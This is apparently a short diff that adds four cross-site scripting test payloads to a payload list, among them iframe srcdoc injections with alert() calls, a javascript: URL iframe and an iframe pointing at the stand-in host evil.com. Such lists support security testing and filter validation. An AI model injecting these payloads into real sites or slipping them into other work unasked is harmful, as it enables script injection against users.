@@ -1,0 +1,4 @@
+<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
+<iframe src=javascript:alert(1)>
+<iframe src=https://evil.com>
